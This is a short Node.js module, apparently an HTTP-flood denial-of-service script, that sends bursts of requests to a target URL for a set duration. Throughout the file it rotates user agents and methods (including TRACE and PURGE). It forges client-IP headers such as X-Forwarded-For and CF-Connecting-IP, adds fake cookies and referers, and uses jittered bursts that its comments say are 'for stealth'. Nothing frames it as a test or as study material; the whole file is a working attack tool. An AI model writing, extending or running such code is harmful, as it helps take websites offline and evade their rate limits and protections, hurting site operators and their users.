const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
];

const methods = ["GET", "HEAD", "OPTIONS", "TRACE", "PURGE"];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://${hostname}/?ref=${Math.random().toString(36).substring(2)}`,
    "X-Forwarded-For": ip,
    "CF-Connecting-IP": ip,
    "Client-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}`
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = randomHeaders(url.hostname);
    const options = {
      method,
      hostname: url.hostname,
      path: url.pathname + url.search || "/",
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;

    // Mimic human-like random delay
    const jitter = Math.floor(Math.random() * 500) + 150;

    for (let i = 0; i < 5; i++) send(); // low burst for stealth
    setTimeout(loop, jitter);
  }

  loop();
};